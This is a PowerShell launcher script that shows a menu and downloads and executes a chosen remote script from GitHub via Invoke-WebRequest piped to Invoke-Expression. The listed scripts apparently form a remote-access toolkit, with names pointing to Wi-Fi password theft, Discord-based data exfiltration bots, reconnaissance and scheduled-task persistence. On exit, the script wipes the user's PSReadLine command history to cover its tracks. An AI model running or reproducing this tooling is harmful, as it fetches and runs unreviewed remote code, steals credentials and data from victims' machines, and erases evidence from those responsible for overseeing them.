function Show-ActionMenu {
    param (
        [array] $Actions
    )
    while ($true) {
        Write-Host "Choose an action to execute or type 'q' to quit:" -ForegroundColor Yellow -BackgroundColor Black
        
        $index = 1
        foreach ($actionUrl in $Actions) {
            $fileName = [System.IO.Path]::GetFileName($actionUrl)
            Write-Host "$index. $fileName"
            $index++
        }
        $selectedActionIndex = Read-Host "Enter the number of the action you want to execute or type 'q' to quit"

        if ($selectedActionIndex -eq 'q') {
            Write-Host "Exiting..." -ForegroundColor Red
            # Add code to clear PSReadLine history
            $psreadlineFolderPath = Join-Path $env:USERPROFILE 'AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine'
            if (Test-Path -Path $psreadlineFolderPath -PathType Container) {
                $files = Get-ChildItem -Path $psreadlineFolderPath
                if ($files.Count -gt 0) {
                    Remove-Item -Path "$psreadlineFolderPath\*" -Force
                }
            }
            break
        }
        if ($selectedActionIndex -ge 1 -and $selectedActionIndex -le $Actions.Count) {
            $selectedUrl = $Actions[$selectedActionIndex - 1]
            $selectedAction = [System.IO.Path]::GetFileNameWithoutExtension($selectedUrl)
            Write-Host "You chose: $selectedAction" -ForegroundColor Green -BackgroundColor Black
            
            $urlContent = (Invoke-WebRequest -Uri $selectedUrl -UseBasicParsing).Content
            Invoke-Expression $urlContent
        } else {
            Write-Host "Invalid selection. Please choose a valid number or type 'q' to quit." -ForegroundColor Red -BackgroundColor Black
        }
    }
}
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
# Define an array of action URLs
$actions = @(
    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/CleanUp.ps1",
    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/AutomatedTaskWithPingInstall.ps1",
    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/PreampCoreDownload.ps1",
    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/BasicInletValveInstall.ps1",
    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/MeshNetworkInstall.ps1",
    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/SearchDog.ps1",
    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/ReconService.ps1",
    "https://gist.githubusercontent.com/CybersamuraiDK/6e0be5c0c47165228895079efa8d98ec/raw/01f60731ba1602f5e8b45c2c3ed1532a5d4373d6/wifi-passwords.ps1",
    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/DiscordDataTransportBot.ps1",
    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/DiscordAutoDataReaperBots.ps1",
    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/WifiPersistentDataReaper.ps1",
    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/TaskSchedulerServiceCreater.ps1",
    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/PingTaskSchedulerCreator.ps1"
)

# Call the function to display the action menu and execute the selected action or quit
Show-ActionMenu -Actions $actions
